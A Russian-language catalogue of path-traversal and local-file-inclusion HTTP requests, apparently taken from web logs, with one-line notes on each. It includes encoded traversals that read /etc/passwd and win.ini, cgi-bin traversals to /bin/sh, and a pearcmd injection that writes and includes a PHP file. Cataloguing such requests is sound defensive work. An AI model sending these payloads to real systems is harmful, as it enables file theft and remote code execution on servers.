# Path Traversal / Local File Inclusion (LFI)

### Запрос 1
```http
/user-backup-code/../../system/system-information
```
Действие: попытка прочитать системную информацию через обход директорий.

### Запрос 2
```http
/api/2.0/mlflow-artifacts/artifacts/%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252F%252E%252E%252Fetc%252fpasswd
```
Действие: двойное URL-кодирование – чтение /etc/passwd.

### Запрос 3
```http
/userentry?accountId=/../../../tomcat/webapps/MK0hd/&symbolName=test&base64UserName=YWRtaW4=
```
Действие: обход для доступа к веб-приложению (LFI/RFI).

### Запрос 4
```http
/model-versions/get-artifact?name=3EtXazOorPq0YM849QJeToudiwn&path=etc%2Fpasswd&version=1
```
Действие: чтение /etc/passwd через параметр path.

### Запрос 5
```http
/iclock/file?url=/../../../../../../../../../windows/win.ini
```
Действие: чтение win.ini (Windows-системный файл).

### Запрос 6
```http
/%2577eb%2575i_%2577sma_Http
```
Действие: двойное кодирование %25 для обхода фильтров (вероятно, LFI).

### Запрос 7
```http
/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
```

### Запрос 8
```http
/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh
```

### Запрос 9
```http
/index.php?lang=../../../../../../../../usr/local/lib/php/pearcmd&+config-create+/&/<?echo(md5(\x22hi\x22));?>+/tmp/index1.php
```

### Запрос 10
```http
/index.php?lang=../../../../../../../../tmp/index1
```

### Запрос 11
```http
/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh
```
